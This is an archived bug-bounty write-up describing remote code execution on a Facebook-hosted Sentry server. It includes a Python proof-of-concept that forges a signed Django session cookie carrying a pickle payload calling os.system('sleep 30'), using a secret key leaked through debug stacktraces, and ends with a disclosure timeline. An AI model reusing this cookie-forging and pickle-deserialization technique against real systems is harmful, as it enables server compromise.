---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-14_remote-code-execution-on-a-facebook-server.md
original_filename: 2018-12-14_remote-code-execution-on-a-facebook-server.md
title: Remote Code Execution on a Facebook server
category: documents
detected_topics:
- command-injection
- path-traversal
- password-reset
- csrf
- api-security
tags:
- imported
- documents
- command-injection
- path-traversal
- password-reset
- csrf
- api-security
language: en
raw_sha256: afa1b7efcc8535ca0f716b58d4fe21ee1ada6e4d98b3568d5e7eaa1ee08667eb
text_sha256: bb7a53d58f9abe54899b76a4bcf84827fa5d0064abb2ea38f13a693123ac9ec5
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: true
---

# Remote Code Execution on a Facebook server

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-14_remote-code-execution-on-a-facebook-server.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, password-reset, csrf, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: True
- Raw SHA256: `afa1b7efcc8535ca0f716b58d4fe21ee1ada6e4d98b3568d5e7eaa1ee08667eb`
- Text SHA256: `bb7a53d58f9abe54899b76a4bcf84827fa5d0064abb2ea38f13a693123ac9ec5`


## Content

---
title: "Remote Code Execution on a Facebook server"
page_title: "Remote Code Execution on a Facebook server – SCRT Team Blog"
url: "https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/"
final_url: "https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/"
authors: ["Daniel Le Gall (@Blaklis_)"]
programs: ["phpMyAdmin"]
bugs: ["LFI", "RCE", "CSRF"]
publication_date: "2018-12-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5522
---

# Remote Code Execution on a Facebook server

I regularly search for vulnerabilities on big services that allow it and have a Bug Bounty program. Here is my first paper which covers a vulnerability I discovered on one of Facebook’s servers.

While scanning an IP range that belongs to Facebook (199.201.65.0/24), I found a Sentry service hosted on 199.201.65.36, with the hostname sentryagreements.thefacebook.com. Sentry is a log collection web application, written in Python with the Django framework.

While I was looking at the application, some stacktraces regularly popped on the page, for an unknown reason. The application seemed to be unstable regarding the user password reset feature, which occasionally crashed. Django debug mode was not turned off, which consequently prints the whole environment when a stacktrace occurs. However, Django snips critical information (passwords, secrets, key…) in those stacktraces, therefore avoiding a massive information leakage.

[![](/wp-content/uploads/2018/08/facebook_crash.png)](/wp-content/uploads/2018/08/facebook_crash.png)

However, by looking at the stacktrace a little more closely, some env keys were interesting :

  * The SESSION_COOKIE_NAME is _sentrysid_
  * The SESSION_SERIALIZER is _django.contrib.sessions.serializers.PickleSerializer_
  * The SESSION_ENGINE is _django.contrib.sessions.backends.signed_cookies_
  * The SENTRY_OPTIONS key that contains some Sentry configuration in a list.

Pickle is a binary protocol for (un)serializing Python object structures, such as classes and methods in them. A comprehensive article that explains what Pickle is and its security implications is available here : https://www.balda.ch/posts/2013/Jun/23/python-web-frameworks-pickle/

If we were able to forge our own session that contains arbitrary pickle content, we could execute commands on the system. However, the _SECRET_KEY_ that is used by Django for signing session cookies is not available in the stacktrace. However, the SENTRY_OPTIONS list contains a key named _system.secret-key_ _,_ that is not snipped. Quoting the Sentry documentation, _system.secret-key_ is “ _a secret key used for session signing. If this becomes compromised itŌĆÖs important to regenerate it as otherwise its much easier to hijack user sessions._ “; wow, it looks like it’s a sort of Django _SECRET-KEY_ override!

[![](/wp-content/uploads/2018/08/facebook_leak.png)](/wp-content/uploads/2018/08/facebook_leak.png)

As we have everything to forge our own cookies with arbitrary pickle content, I wrote a little script that adds a payload into my own _sentrysid_ cookie. Here it is :
  
  
  #!/usr/bin/python
  import django.core.signing, django.contrib.sessions.serializers
  from django.http import HttpResponse
  import cPickle
  import os
  
  SECRET_KEY=***REDACTED***
  #Initial cookie I had on sentry when trying to reset a password
  cookie='gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'
  newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
  class PickleRce(object):
  def __reduce__(self):
  return (os.system,("sleep 30",))
  newContent['testcookie'] = PickleRce()
  
  print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
  

This code is a simple proof of concept; it takes the content of an existing _sentrysid_ cookie, and replaces its content with an arbitrary object that will run a _os.system(“sleep 30”)_ when unserialized.

When using this cookie, the page actually takes an additional 30 seconds to load, which confirms the presence of the flaw.

Facebook acknowledged the vulnerability, took down the system until the flaw was patched, and then notified me about the patch being in place.

Here is the disclosure timeline, which also demonstrates that Facebook security staff is reactive ­¤Öé :

  * 30.07.2018 00:00 CEST : initial disclosure with every details.
  * 30.07.2018 15:25 CEST : triaged and system takedown.
  * 09.08.2018 18:10 CEST : patch in place.
  * 09.08.2018 20:10 CEST : a 5000$ bounty is awarded – the server was in a separate VLAN with no users’ specific data.

Thanks for reading!

Blaklis

Posted on [August 24, 2018January 12, 2023](/2018/08/24/remote-code-execution-on-a-facebook-server/)Author [blogscrt](/author/blogscrt/)Categories [News](/category/news/), [Vulnerability](/category/vulnerability/)
